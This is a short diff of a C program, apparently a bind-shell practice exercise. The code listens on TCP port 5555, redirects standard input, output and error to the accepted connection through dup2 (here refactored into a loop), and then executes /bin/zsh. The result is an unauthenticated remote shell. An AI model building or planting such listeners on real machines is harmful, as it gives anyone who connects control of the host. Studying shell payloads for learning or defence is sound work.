@@ -22,7 +22,7 @@ int main(void){
   server_addr.sin_family = AF_INET; // IPV4
   server_addr.sin_addr.s_addr = INADDR_ANY; // listen in any local port
   server_addr.sin_port = htons(5555); // convert to network byte order
-  
+
   // assigning a name to a socket
   int bindfd = bind(sockfd, (struct sockaddr *)&server_addr, sizeof(server_addr));
 
@@ -52,13 +52,13 @@ int main(void){
   }
 
   //Dup2  
-  dup2(acceptfd, 0);
-  dup2(acceptfd, 1);
-  dup2(acceptfd, 2);
+  for (int i = 0; i < 3; i++){
+
+    dup2(acceptfd, i);
+  }
 
   // Execve
   execve("/bin/zsh", NULL, NULL);
-  
+
   return 0;
 }
-
